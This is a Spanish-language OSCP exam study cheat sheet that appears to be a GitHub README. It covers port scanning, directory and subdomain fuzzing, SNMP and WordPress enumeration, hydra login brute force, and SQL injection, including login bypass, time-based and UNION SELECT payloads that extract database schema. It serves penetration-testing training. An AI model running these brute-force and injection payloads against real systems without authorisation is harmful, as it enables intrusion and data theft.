## Preparación para la OSCP - Metodología & Scripts

![banner_oscp](https://user-images.githubusercontent.com/87484792/177843931-081eca92-24f1-4743-a632-48ee65b2ba4a.png)

# Enumeración - Fase Inicial
## Enumeración de puertos

`sudo nmap --minrate-5000 -p- -vvv -Pn -n -oG openPorts.txt <ip>` # Encontrar puertos con nmap </br>

`sudo nmap -sSCV -p{ports} -oN servicesPorts.txt <ip>` # Verificar que servicios hay en los puertos encontrados.

`sudo nmap --script=http-enum  -p {port http/s} <ip>` # Pequeño script de nmap (".nse") para la verificación de directorios en http/s

`sudo nmap -sU -T5 --top-ports 500 <ip> ` # Encontrar puertos UDP con nmap

## Enumeración de directorios - Fuzzing 

`wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<ip>/FUZZ` # Encontrar directorios disponibles con wfuzz

`wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -H "cookie: SSID=dasd45ads6aa5s" http://<ip>/FUZZ` # Encontrar directorios disponibles con cookies

`wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -d "id=FUZZ&catalogue=1" <ip>` # Fuzzear data

`dirsearch --url http://ip/` # Fuzzear con dirsearch

`dirsearch --url http://ip/ -e .txt,.aspx` # Fuzzear con dirsearch con extensiones propias

`dirsearch --url http://ip/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt` # Fuzzear con dirsearch con diccionario propio

```
Tips:
** Enumerar directorios ocultos "http://ip/.FUZZ/"
** Enumerar directorios dentro de otros directorios "http://ip/admin/FUZZ"
** En wfuzz, puedes skyp el certificado SSL con la bandera "-k"
** Puedes usar hilos para agilizar, no aconsejable poner más de 200 "-t 200"
```

## Enumeración de subdominios - Fuzzing 

`wfuzz --hc 404 -c -w /usr/share/amass/wordlists/subdomains-top1mil-110000.txt -H "HOST: FUZZ.domain.htb" domain.htb` # Fuzzear con wfuzz subdominios

`gobuster vhost --url domain.htb --wordlist /usr/share/amass/wordlists/subdomains-top1mil-110000.txt` # Fuzzing con gobuster subdomains

`dig axfr @dns-server <target>` # Ataque de transferencia de zona (Domain's Attack)

`ldns-walk @ns1.insecuredns.com insecuredns.com` # Walking for DNS

## SNMP Enumeration 

Generalmente corre sobre puertos UPD ( 161 ), nos puede permitir enumerar más de la cuenta a nivel de sistema. Para saber qué software corren, así como rutas, usuarios del sistema, puertos internos abiertos TCP/UDP, etc.

Lo primero que necesitamos saber es la *community string*, de normal general suele estar entre **public** o **private**

`onesixtyone -c dic.txt -i output.txt` # onesixtyone nos ayuda a obtener la community string con fuerza bruta.

Una vez obtenemos la *community string* </br>
<h5>note: La versión suele ser la 2c</h5>

`snmpbulkwalk -c [COMM_STRING] -v [VERSION] [IP] . `  # Enumeración de SNMP con snmpbulkwalk

`snmp-check [DIR_IP] -p [PORT] -c [COMM_STRING]` # Enumeración de SNMP con snmp-check
 
`nmap --script "snmp* and not snmp-brute" <target>` # Apoyo a las enumeraciones, script de nmap.

## WordPress

Este gestor de contenidos (CMS) suele ser un punto clave en los CTF, contiene un panel de login y pluggins que suelen ser vulnerables.

`wpscan -u "http://ip/" `

En caso de que la web principal del gestor de contenido se encuentre en otra ruta personalizada, por ejemplo /invent-wordpress/, deberemos especificarlo a través del parámetro --wp-content-dir para la correcta enumeración desde wpscan:

`wpscan -u "http://ip/" --wp-content-dir "invent-wordpress"` # Escaner WP con la ruta modificada

Proseguimos a encontrar usuarios validos para 'WP'.

`wpscan -u "http://ip/" --enumerate u` # Enumeramos usuarios

`wpscan -u "http://ip/" --username usuario -w /usr/share/SecList/Usernames/xato-usernames-top-1millions-20000.txt` # Enumeramos usuarios con wordlists.

Una forma de bypassear posibles bloqueos es jugar con el parámetro --random-agent, de la siguiente forma:

`$~ wpscan -u "http://ip/" --username usuario -w /usr/share/SecList/Usernames/xato-usernames-top-1millions-20000.txt  --random-agent`

Tambien es posible enumerar usuarios validos si aplicamos fuerza bruta con hydra. Tenemos que ver si hay fuga de información.

`hydra -L dict_Users.txt -p test <ip> "http-post-form" "/path_login.php:user=^USER^&password=^PASS^:F=messageError"` # Fuerza bruta WP para listar usuarios.

`hydra -l admin -P dict_Password.txt <ip> "http-post-form" "/path_login.php:user=^USER^&password=^PASS^:F=messageError"` # Fuerza bruta WP para el usuario admin.

Es importante ver si la web cuenta con contenido escrito. Esto es importante para poder crear nuestro propio diccionario de palabras claves.

`cewl -w diccionario http://ip/ --with-numbers ` # aplicamos cewl, esto nos hará un diccionario con palabras clave de la web.

Enumerar y detectar pluggins vulnerables tambien ayudaran a la intrusión.

`wpscan --url http(s)://ip/ --enumerate vp` # "vp" Detectará pluggins vulnerable

`wpscan --url http(s)://ip/ --enumerate p` # "p" Detectará todos los pluggins

`wpscan --url http(s)://ip/ --enumerate p --plugins-detection aggressive` # Detectará todos los pluggins, con un parametro agresivo. Recomendable.

## SQLI
*SqlMap no está permitido en el OSCP*

**Inyección basica de error**

`admin' or 1=1;-- -` # Inyección en panel de login

**Inyección por tiempo**

`admin' or sleep(5);-- -` # Inyección en panel de login, controlada por el tiempo de respuesta. En este caso, 5 segundos.

**Enumeración de caracteres en la base de datos**

*Para esta enumeración, es necesario conocer algún dato valido ya que usamos el operador "AND".*

`admin' and substring(username,1,1)='a' #devolverá true, ya que la primera posición de "admin" es "a". ` # Enumeración por caracter, en base de error.

**Union Select**

Empezaremos con una web de ejemplo:

`http://fakesite.com/report.php?id=23`

Lo primero que realizaremos, será obtener algún tipo de error, para ello intentaremos romper la Query.

`http://fakesite.com/report.php?id=23' ` # Con una comilla final.

`http://fakesite.com/report.php?id=23' order by 5;-- - ` # Intentamos sacar cuantas tablas tiene la BBDD.

*A tener en cuenta, que a veces cuando sobre-excedemos con el order by, cierto contenido de la web, puede desaparecer*

```
http://fakesite.com/report.php?id=23 and 0 union select 1,2,3,4,5;-- -
http://fakesite.com/report.php?id=23 and false union select 1,2,3,4,5;-- -
http://fakesite.com/report.php?id=-23 union select 1,2,3,4,5;-- -
http://fakesite.com/report.php?id=23000000 union select 1,2,3,4,5;-- -
http://fakesite.com/report.php?id=null union select 1,2,3,4,5;-- -
http://fakesite.com/report.php?id=23 && 0 union select 1,2,3,4,5;-- -

# Otras formas de romper Query <-- URLEncondear.
```

Encontrado las tablas, continuamos:

`http://fakesite.com/report.php?id=23' union select 1,2,3,4,5;-- -` # Suponiendo que tenga 5 tablas, enumeramos.

*Podemos sustituir los números por lo que queramos, la cosa es tener visible que nos reporta la inyección de la query*

Suponiendo que se visualiza el número 3, podemos empezar a sustituir para filtrar contenido de la base de datos.

`http://fakesite.com/report.php?id=-23 union select 1,2,database(),4,5;-- -` # imprime el nombre de la base de datos.

Ahora podemos empezar a enumerar las tablas

`http://fakesite.com/report.php?id=-23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database();-- -` # enumeramos tablas

*podemos jugar con limit para imprimir todo el contenido por lineas*

`http://fakesite.com/report.php?id=-23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database() limit 0,1;-- -`

Ahora el proceso es muy similar para obtener las columnas

`http://fakesite.com/report.php?id=-23 union Select 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='tablenamehere;-- -'` # obtenemos las columnas
